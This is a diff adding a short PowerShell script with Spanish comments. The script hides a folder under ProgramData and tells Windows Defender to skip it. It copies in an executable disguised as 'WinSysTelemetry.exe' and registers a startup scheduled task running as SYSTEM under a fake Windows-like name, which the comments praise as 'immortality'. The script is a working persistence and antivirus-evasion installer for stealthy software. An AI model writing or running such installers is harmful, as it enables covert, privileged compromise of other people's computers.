@@ -1,0 +1,18 @@
+# 1. Crear carpeta oculta y decirle al antivirus que la ignore
+New-Item -Path "C:\ProgramData\SysUpdate" -ItemType Directory -Force
+attrib +h "C:\ProgramData\SysUpdate"
+Add-MpPreference -ExclusionPath "C:\ProgramData\SysUpdate"
+
+# 2. Copiar tu archivo ahí dentro
+Copy-Item ".\WinSysTelemetry.exe" -Destination "C:\ProgramData\SysUpdate\WinSysTelemetry.exe" -Force
+
+# 3. Crear la Tarea Programada como SYSTEM (Aquí está la magia de la inmortalidad)
+$action = New-ScheduledTaskAction -Execute "C:\ProgramData\SysUpdate\WinSysTelemetry.exe"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "WindowsSystemTelemetry" -Action $action -Trigger $trigger -Principal $principal -Force
+
+# 4. Arrancar de inmediato
+Start-ScheduledTask -TaskName "WindowsSystemTelemetry"
+
+Write-Host "¡Instalación blindada completada!" -ForegroundColor Green
